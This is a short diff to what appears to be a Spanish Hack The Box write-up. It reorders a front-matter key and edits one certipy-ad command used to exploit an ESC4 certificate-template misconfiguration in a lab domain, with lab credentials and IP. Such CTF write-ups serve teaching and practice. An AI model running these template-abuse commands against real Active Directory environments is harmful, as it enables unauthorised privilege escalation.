@@ -1,8 +1,8 @@
 ---
+icon: desktop
 hidden: true
 noIndex: true
 noRobotsIndex: true
-icon: desktop
 layout:
   title:
     visible: true
@@ -525,7 +525,7 @@ Procederemos a realizar la explotación del ESC4, para ello lo primero será gua
 
 {% code overflow="wrap" %}
 ```bash
-certipy-ad template -u 'ca_svc@sequel.htb' -p 'Password01!' -template DunderMifflinAuthentication -save-oid -dc-ip 10.10.11.51
+certipy-ad template -u 'ca_svc@sequel.htb' -p 'Password01!' -template DunderMifflinAuthentication -save-old -dc-ip 10.10.11.51
 ```
 {% endcode %}
 
